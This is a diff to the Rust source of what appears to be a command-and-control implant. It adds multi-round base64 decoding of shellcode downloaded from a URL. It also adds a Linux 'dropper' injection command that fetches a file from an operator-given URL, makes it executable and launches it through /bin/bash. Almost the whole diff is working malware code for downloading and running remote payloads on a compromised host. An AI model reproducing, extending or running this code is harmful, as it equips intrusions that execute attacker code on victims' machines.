@@ -1,7 +1,8 @@
 use std::error::Error;
 use crate::logger::Logger;
 use crate::cmd::CommandArgs;
-#[cfg(windows)] use base64::decode as b64_decode;
+
+use base64::decode as b64_decode;
 #[cfg(windows)] extern crate winapi;
 #[cfg(windows)] extern crate kernel32;
 #[cfg(windows)] use winapi::um::winnt::{
@@ -20,64 +21,85 @@ use crate::cmd::CommandArgs;
     synchapi::WaitForSingleObject
 };
 #[cfg(windows)] use std::ptr;
-#[cfg(windows)] use reqwest::Client;
+use reqwest::Client;
+
+async fn decode_shellcode(sc: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, &str> {
+    logger.debug("Starting shellcode debug".to_string());
+    let mut shellcode_vec = Vec::from(sc.trim().as_bytes());
+    for i in 0..b64_iterations {
+        logger.debug(format!("Decode iteration: {i}"));
+        match b64_decode(shellcode_vec) {
+            Ok(d) => {
+                shellcode_vec = d
+                    .into_iter()
+                    .filter(|&b| b != 0x0a)
+                    .collect();
+            },
+            Err(e) => { 
+                let err_msg = e.to_string();
+                logger.err(format!("{}", err_msg.to_owned()));
+                return Err("Could not decode shellcode"); 
+            }
+        };
+    }
+    Ok(shellcode_vec)
+}
+
 
 /// Handles the retrieval and deobfuscation of shellcode from a url.
-#[cfg(windows)]
+
 async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, &str> {
     // Download shellcode, or try to
     let client = Client::new();
     if let Ok(r) = client.get(url).send().await {
         if r.status().is_success() {   
-            logger.info(format!("Got the shellcode")); 
+            logger.info(format!("Downloaded shellcode")); 
             // Get the shellcode. Now we have to decode it
-            let mut shellcode_encoded: Vec<u8>;
-            let mut shellcode_string: String;
-            let mut shellcode: Vec<u8>;
+            let shellcode_decoded: Vec<u8>;
+            let shellcode_final_vec: Vec<u8>;
             if let Ok(sc) = r.text().await {
-                shellcode_encoded = Vec::from(sc.trim().as_bytes());
                 logger.info(format!("Got encoded bytes"));
-                for i in 0..b64_iterations {
-                    logger.debug(format!("Decode iteration: {i}"));
-                    match b64_decode(shellcode_encoded) {
-                        Ok(d) => {
-                            shellcode_encoded = d
-                                .into_iter()
-                                .filter(|&b| b != 0x0a)
-                                .collect();
-                        },
-                        Err(e) => { 
-                            let err_msg = e.to_string();
-                            logger.err(format!("{}", err_msg.to_owned()));
-                            return Err("Could not decode shellcode"); 
-                        }
-                    };
-                    
+                logger.debug(format!("Encoded shellcode length: {}", sc.len()));
+                match decode_shellcode(sc, b64_iterations, logger).await {
+                    Ok(scd) => { shellcode_decoded = scd; },
+                    Err(e)  => { return Err(e); }
+                }; 
+                
+                
+                #[cfg(windows)] {
+                    // Convert bytes to our proper string
+                    // This only happens on Windows
+                    let shellcode_string: String;
+                    if let Ok(s) = String::from_utf8(shellcode_decoded) {
+                        shellcode_string = s;
+                    } else {
+                        let err_msg = "Could not convert shellcode bytes to string";
+                        logger.err(err_msg.to_string());
+                        return Err("Could not convert shellcode bytes to string");
+                    }                    
+                    // At this point, we have the comma-separated "0xNN" form of the shellcode.
+                    // We need to get each one until a proper u8.
+                    // Now, keep in mind we only do this for Windows, because we pretty much only make raw byes,
+                    // Not '0x' strings for Linux.
+                    shellcode_final_vec = shellcode_string
+                        .split(",")
+                        .map(|s| s.replace("0x", ""))
+                        .map(|s| s.replace(" ", ""))                    
+                        .map(|s|{ 
+                            match u8::from_str_radix(&s, 16) {
+                                Ok(b) => b,
+                                Err(_) => 0
+                            }
+                        })
+                        .collect();
                 }
-                // Convert bytes to our proper string
-                if let Ok(s) = String::from_utf8(shellcode_encoded) {
-                    shellcode_string = s;
-                } else {
-                    let err_msg = "Could not convert shellcode bytes to string";
-                    logger.err(err_msg.to_string());
-                    return Err("Could not convert shellcode bytes to string");
+
+                #[cfg(not(windows))] {
+                    shellcode_final_vec = shellcode_decoded;
                 }
-                // At this point, we have the comma-separated "0xNN" form of the shellcode.
-                // We need to get each one until a proper u8.
-                shellcode = shellcode_string
-                    .split(",")
-                    .map(|s| s.replace("0x", ""))
-                    .map(|s| s.replace(" ", ""))                    
-                    .map(|s|{ 
-                        match u8::from_str_radix(&s, 16) {
-                            Ok(b) => b,
-                            Err(_) => 0
-                        }
-                    })
-                    .collect();
                 
                 // The actual success
-                return Ok(shellcode);
+                return Ok(shellcode_final_vec);
 
             } else {
                 let err_msg = "Could not decode shellcode";
@@ -280,5 +302,72 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
 
 #[cfg(not(windows))]
 pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
-    Ok("Can only inject shellcode on Windows!".to_string())   
+    
+    if let Some(inject_type) = cmd_args.nth(0) {
+
+        // Set up our variables; each one could fail on us.
+        // Yes this is a lot of verbose error checking, but this
+        // has to be rock solid or the agent will die.
+        let url: String;
+
+        match inject_type.as_str() {
+            "dropper" => {
+                // Usage: inject dropper [url] [filename]
+                // Get URL
+                use crate::cmd::download;
+                use std::os::unix::fs::PermissionsExt;
+                let filename: String;
+                use std::process::Command;
+
+                match cmd_args.nth(0) {
+                    Some(u) => { 
+                        logger.debug(format!("Shellcode URL: {u}"));
+                        url = u; 
+                    },
+                    None => { return Ok("Could not parse URL".to_string()); }
+                };
+
+                // Get filename
+                match cmd_args.nth(0) {
+                    Some(f) => { 
+                        logger.debug(format!("Filename: {f}"));
+                        filename = f; 
+                    },
+                    None => { return Ok("Could not parse filename".to_string()); }
+                };
+
+                let mut download_args = CommandArgs::from_string(
+                    format!("{url} {filename}")
+                );
+                download::handle(&mut download_args, logger).await?;
+                match std::fs::File::open(&filename) {
+                    Ok(f) => {
+                        f.set_permissions(PermissionsExt::from_mode(0o755))?;
+                    },
+                    Err(e) => { return Ok(e.to_string()); }
+                };
+
+                let mut cmd_string = String::new();
+
+                // Basically, if it's not a proper path, add ./
+                if !cmd_string.contains("/") {
+                    cmd_string.push_str("./");
+                }
+
+                cmd_string.push_str(filename.as_str());
+
+                // Fire off the command
+                Command::new("/bin/bash")
+                    .arg("-c")
+                    .arg(cmd_string)
+                    .spawn()?;
+
+                Ok("Dropper completed!".to_string())
+            }
+            _ => { return Ok("Unknown injection method!".to_string()) ;}
+        }
+
+    } else {
+        return Ok("No injection type provided!".to_string());
+    }
 }
